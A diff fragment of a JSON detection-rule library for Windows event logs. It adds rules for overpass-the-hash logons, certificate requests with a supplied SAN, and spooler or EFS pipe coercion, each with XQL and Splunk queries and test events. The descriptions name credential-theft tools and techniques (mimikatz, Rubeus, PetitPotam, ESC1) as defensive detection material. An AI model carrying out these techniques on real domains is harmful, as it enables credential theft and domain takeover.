+    "no_match": [
+     {
+      "event.id": 4724,
+      "subject.user": "Administrator"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0060",
+   "title": "Logon with new credentials (logon type 9, overpass-the-hash)",
+   "description": "Event 4624 with logon type 9 and the seclogo logon process. It is what runas /netonly creates, and also what mimikatz sekurlsa::pth and Rubeus createnetonly create when they start a process that uses a stolen hash or ticket for network access.",
+   "attack": [
+    "T1550.002",
+    "T1134.002"
+   ],
+   "tactic": "lateral-movement",
+   "severity": "medium",
+   "logsource": "windows_event",
+   "selections": {
+    "netonly": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4624"
+      ]
+     },
+     {
+      "field": "logon.type",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "9"
+      ]
+     },
+     {
+      "field": "logon.process",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "seclogo"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "netonly"
+   },
+   "condition_text": "netonly",
+   "triage": [
+    "Find the process that started the logon session and what it connected to.",
+    "Any type 9 logon on a workstation of a normal user is worth asking about."
+   ],
+   "false_positives": [
+    "Admins using runas /netonly to manage other domains. Baseline the hosts and accounts."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_logon_type = json_extract_scalar(action_evtlog_data_fields, \"$.LogonType\"), evt_logon_process = json_extract_scalar(action_evtlog_data_fields, \"$.LogonProcessName\")\n| filter action_evtlog_event_id = 4624 and evt_logon_type = \"9\" and evt_logon_process contains \"seclogo\"\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=4624 AND lower(LogonType)=\"9\" AND match(LogonProcessName, \"(?i)seclogo\")\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4624,
+      "target.user": "studentx",
+      "logon.type": "9",
+      "logon.process": "seclogo",
+      "auth.package": "Negotiate"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4624,
+      "target.user": "studentx",
+      "logon.type": "3",
+      "logon.process": "Kerberos"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0061",
+   "title": "Certificate issued with a subject alternative name supplied in the request",
+   "description": "CA event 4886 or 4887 where the request attributes carry a SAN (san:upn=...). If the template lets the requester choose the subject (ESC1), or the CA accepts SAN attributes (ESC6), any user can get a certificate for an administrator and log on with it.",
+   "attack": [
+    "T1649"
+   ],
+   "tactic": "credential-access",
+   "severity": "high",
+   "logsource": "windows_event",
+   "selections": {
+    "ca_event": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4886",
+       "4887"
+      ]
+     }
+    ],
+    "san": [
+     {
+      "field": "cert.attributes",
+      "op": "re",
+      "all": false,
+      "values": [
+       "san:.*(upn|dns)="
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "ca_event"
+     },
+     {
+      "sel": "san"
+     }
+    ]
+   },
+   "condition_text": "ca_event and san",
+   "triage": [
+    "Compare the requester with the identity in the SAN. A normal user asking for an admin's UPN is an attack.",
+    "Revoke the certificate and remove ENROLLEE_SUPPLIES_SUBJECT or the EDITF_ATTRIBUTESUBJECTALTNAME2 flag."
+   ],
+   "false_positives": [
+    "Web server or device templates where the requester supplies DNS names by design. Exclude those templates."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_cert_attributes = json_extract_scalar(action_evtlog_data_fields, \"$.Attributes\")\n| filter action_evtlog_event_id in (4886, 4887) and evt_cert_attributes ~= \"(?i)san:.*(upn|dns)=\"\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where (EventCode=4886 OR EventCode=4887) AND match(Attributes, \"(?i)san:.*(upn|dns)=\")\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4887,
+      "cert.requester": "CORP\\studentx",
+      "cert.attributes": "CertificateTemplate:HTTPSCertificates san:upn=administrator@corp.local"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4887,
+      "cert.requester": "CORP\\studentx",
+      "cert.attributes": "CertificateTemplate:User"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0062",
+   "title": "Remote access to the print spooler or EFS pipe (authentication coercion)",
+   "description": "Event 5145 for IPC$ with the spoolss or efsrpc pipe. Printer bug (MS-RPRN) and PetitPotam (MS-EFSR) and DFSCoerce (MS-DFSNM) force a server, often a DC, to authenticate to an attacker-chosen host. With unconstrained delegation on that host, the attacker captures the DC's TGT.",
+   "attack": [
+    "T1187"
+   ],
+   "tactic": "credential-access",
+   "severity": "medium",
+   "logsource": "windows_event",
+   "selections": {
+    "pipe": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "5145"
+      ]
+     },
+     {
+      "field": "share.name",
+      "op": "endswith",
+      "all": false,
+      "values": [
+       "IPC$"
+      ]
+     },
+     {
+      "field": "share.target",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "spoolss",
+       "efsrpc",
+       "netdfs"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "pipe"
+   },
+   "condition_text": "pipe",
+   "triage": [
+    "Check the source IP. A workstation calling the spooler on a DC is suspicious.",
+    "Look for a TGT for the DC computer account appearing on another host (Rubeus monitor, DL-0031)."
+   ],
+   "false_positives": [
+    "Print servers receiving normal spooler traffic. Turn off the spooler on DCs and this becomes quiet there."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_share_name = json_extract_scalar(action_evtlog_data_fields, \"$.ShareName\"), evt_share_target = json_extract_scalar(action_evtlog_data_fields, \"$.RelativeTargetName\")\n| filter action_evtlog_event_id = 5145 and evt_share_name ~= \"(?i)IPC\\\\$$\" and evt_share_target in (\"spoolss\", \"efsrpc\", \"netdfs\")\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=5145 AND match(ShareName, \"(?i)IPC\\\\$$\") AND (lower(RelativeTargetName)=\"spoolss\" OR lower(RelativeTargetName)=\"efsrpc\" OR lower(RelativeTargetName)=\"netdfs\")\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 5145,
+      "subject.user": "studentx",
+      "share.name": "\\\\*\\IPC$",
+      "share.target": "spoolss",
+      "source.ip": "172.16.100.1"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 5145,
+      "share.name": "\\\\*\\SYSVOL",
+      "share.target": "corp.local\\Policies"
+     }
+    ]
+   }
   }
  ],
  "logsources": {
@@ -2710,6 +5247,36 @@
     "process.name",
     "process.path",
     "user"
+   ]
+  },
+  "windows_event": {
+   "description": "A Windows event log record: Security (4662, 4769, 5136, 4887...) or PowerShell 4104 (XDR EVENT_LOG, Splunk Add-on for Windows)",
+   "fields": [
+    "attribute.name",
+    "attribute.value",
+    "auth.package",
+    "cert.attributes",
+    "cert.requester",
+    "cert.subject",
+    "event.id",
+    "logon.process",
+    "logon.type",
+    "member.name",
+    "object.class",
+    "object.dn",
+    "object.properties",
+    "object.type",
+    "preauth.type",
+    "script.text",
+    "service.name",
+    "share.name",
+    "share.target",
+    "sid_history",
+    "source.ip",
+    "subject.user",
+    "target.user",
+    "ticket.encryption",
+    "ticket.transmitted_services"
    ]
   }
  }
